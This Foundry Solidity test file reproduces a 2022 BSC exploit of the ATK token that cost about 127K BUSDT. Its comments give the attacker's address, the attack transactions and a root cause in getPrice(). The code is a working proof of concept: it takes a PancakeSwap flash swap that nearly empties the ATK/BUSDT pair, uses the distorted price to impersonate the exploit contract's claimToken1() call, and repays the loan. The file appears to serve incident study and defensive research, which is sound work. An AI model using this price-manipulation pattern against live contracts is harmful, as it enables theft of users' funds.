// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~127K BUSDT
// Attacker : 0x3DF6cd58716d22855aFb3B828F82F10708AfbB4f
// Attack Contract : https://bscscan.com/address/0xd7ba198ce82f4c46ad8f6148ccfdb41866750231
// Vulnerable Contract : https://bscscan.com/address/0x9cb928bf50ed220ac8f703bce35be5ce7f56c99c
// Attack related Txs :
//  - https://bscscan.com/tx/0xb181e88e6b37ee9986f2a57aefb94779402fdb928654aa7c1dda5138b90d0e14
//  - https://bscscan.com/tx/0x9e328f77809ea3c01833ec7ed8928edb4f5798c96f302b54fc640a22b3dd1a52
//  - https://bscscan.com/tx/0x55983d8701e40353fee90803688170a16424ee702f6b21bb198bb8e7282112cd
//  - https://bscscan.com/tx/0x601b8ab0c1d51e71796a0df5453ca671ae23de3d5ec9ffd87b9c378504f99c32

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9cb928bf50ed220ac8f703bce35be5ce7f56c99c#code#L706

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1580095325200474112
// Article CertiK : https://www.certik.com/resources/blog/1YsQo8TnxCvwalqvtkFLtC-journey-of-awakening-incident-analysis

// Closed-source contract is designed to deposit and claimReward(), the claim function use getPrice() in ATK token contract
// Root cause: getPrice() function

contract ContractTest is Test {
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant ATK_TOKEN = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant ATK_BUSDT_PAIR = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
    address constant EXPLOIT_CONTRACT = 0xD7ba198ce82f4c46AD8F6148CCFDB41866750231;
    address constant EXPLOIT_AUX_CONTRACT = 0x96bF2E6CC029363B57Ffa5984b943f825D333614;

    uint256 swapamount;

    function setUp() public {
        vm.createSelectFork("bsc", 22_102_838);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
        vm.label(address(ATK_TOKEN), "ATK_TOKEN");
        vm.label(address(BUSDT_TOKEN), "BUSDT_TOKEN");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(ATK_BUSDT_PAIR), "ATK_BUSDT_PAIR");
        vm.label(EXPLOIT_CONTRACT, "EXPLOIT_CONTRACT");
        vm.label(EXPLOIT_AUX_CONTRACT, "EXPLOIT_AUX_CONTRACT");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker ATK balance before exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18
        );

        WBNB_TOKEN.deposit{value: 2 ether}();
        _WBNBToBUSDT();

        swapamount = BUSDT_TOKEN.balanceOf(address(ATK_BUSDT_PAIR)) - 3 * 1e18;
        ATK_BUSDT_PAIR.swap(swapamount, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] Attacker ATK balance after exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18
        );
    }

    /*
     * Callback function called by PancakeSwap during the flashswap
     */
    function pancakeCall(
        address, /*sender*/
        uint256, /*amount0*/
        uint256, /*amount1*/
        bytes calldata /*data*/
    ) public {
        // EXPLOIT_CONTRACT calls `claimToken1()` function
        vm.prank(EXPLOIT_CONTRACT);
        (bool success,) = EXPLOIT_AUX_CONTRACT.call(abi.encodeWithSignature("claimToken1()"));
        require(success, "Call `claimToken1()` failed");

        // Return the BUSDT to the ATK_BUSDT_PAIR
        BUSDT_TOKEN.transfer(address(ATK_BUSDT_PAIR), swapamount * 10_000 / 9975 + 1000);
    }

    /**
     * Auxiliary function to swap all WBNB to BUSDT
     */
    function _WBNBToBUSDT() internal {
        WBNB_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB_TOKEN);
        path[1] = address(BUSDT_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
